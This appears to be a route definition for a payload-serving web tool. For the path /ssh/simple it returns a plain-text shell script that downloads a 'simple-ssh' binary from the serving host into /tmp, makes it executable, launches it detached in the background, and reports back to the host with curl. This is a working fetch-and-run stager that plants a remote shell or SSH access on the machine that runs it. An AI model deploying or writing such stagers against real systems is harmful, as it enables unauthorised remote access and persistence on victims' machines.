---
title: Simple SSH
description: Simple SSH (requires build of simple ssh in static dir)
weight: 1
pattern: /ssh/simple$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    curl {{.Request.Host}}/static/simple-ssh > /tmp/s
    chmod +x /tmp/s
    curl -d "$(bash -c "/tmp/s & disown 2>&1" & )"  {{.Request.Host}}/l/ssh-status
---
